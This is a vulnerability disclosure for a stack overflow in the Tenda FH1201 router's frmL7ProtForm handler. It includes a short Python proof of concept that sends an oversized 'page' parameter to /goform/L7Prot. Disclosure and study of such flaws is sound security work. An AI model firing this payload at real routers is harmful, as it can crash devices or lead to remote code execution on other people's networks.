# Tenda FH1201 frmL7ProtForm
### Overview
vendor: Tenda

product: FH1201

version: V1.2.0.14(408)

type: Stack Overflow
### Vulnerability Description
Tenda FH1201 V1.2.0.14(408) were discovered to contain a stack overflow via the page parameter in the frmL7ProtForm function.
### Vulnerability details
In function frmL7ProtForm line 205, it reads in a user-provided parameter `page`, and the variable is passed to the `sprintf` function without any length check, which may overflow the stack-based buffer `s_2`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/19.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/L7Prot"

data = {
    "page": "a" * 1000,
}

response = requests.post(url, data=data)
print(response.text)
```

![](images/20.png)
